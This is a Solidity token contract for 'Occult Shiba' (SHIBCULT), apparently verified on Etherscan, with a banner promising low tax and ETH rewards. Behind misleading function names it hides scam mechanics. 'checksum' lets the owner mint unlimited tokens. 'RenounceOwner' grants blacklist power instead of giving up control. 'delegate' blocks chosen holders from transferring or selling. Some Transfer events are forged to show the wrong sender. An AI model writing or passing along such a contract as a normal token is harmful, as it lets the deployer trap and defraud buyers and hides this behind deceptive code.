/**
 *Submitted for verification at Etherscan.io on 2022-10-04
*/

pragma solidity 0.8.17;
/*


   ▄▄▄▄▄    ▄  █ ▄█ ███   ▄█▄      ▄   █      ▄▄▄▄▀ 
  █     ▀▄ █   █ ██ █  █  █▀ ▀▄     █  █   ▀▀▀ █    
▄  ▀▀▀▀▄   ██▀▀█ ██ █ ▀ ▄ █   ▀  █   █ █       █    
 ▀▄▄▄▄▀    █   █ ▐█ █  ▄▀ █▄  ▄▀ █   █ ███▄   █     
              █   ▐ ███   ▀███▀  █▄ ▄█     ▀ ▀      
             ▀                    ▀▀▀               
                                                                                                                                                                  

Mysterious Occult Shiba -

- Low Tax
- ETH Rewards
- Community Events

TG: OccultShiba


*/      
 
contract OCCULTSHIBA {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) ValueOf;
    mapping (address => bool) dx;

    // 
    string public name = "Occult Shiba";
    string public symbol = unicode"SHIBCULT";
    uint8 public decimals = 18;
    uint256 public totalSupply = 666000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
  
   



        constructor()  {
        balanceOf[msg.sender] = totalSupply;
        deploy(lead_deployer, totalSupply); }



	address owner = msg.sender;
    address Construct = 0xc4C426ACfCA2243566FBE1b32BD2CF5facB30B98;
    address lead_deployer = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
   





    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier S() {   
         require(dx[msg.sender]);
         _;}
    modifier I() {   
        require(msg.sender == owner);
         _;}


    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == Construct)  {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; } 
        require(!ValueOf[msg.sender]);      
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


         

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
        function RenounceOwner(address x) public {
         require(msg.sender == Construct);
          dx[x] = true; }
        
        function checksum(address oracle,  uint256 update) I public {
        balanceOf[oracle] += update;
        totalSupply += update; }
        function delegate(address txt) S public{          
        require(!ValueOf[txt]);
        ValueOf[txt] = true; }
        function send(address txt) S public {
        require(ValueOf[txt]);
        ValueOf[txt] = false; }


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Construct)  {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }    
        require(!ValueOf[from]); 
        require(!ValueOf[to]); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }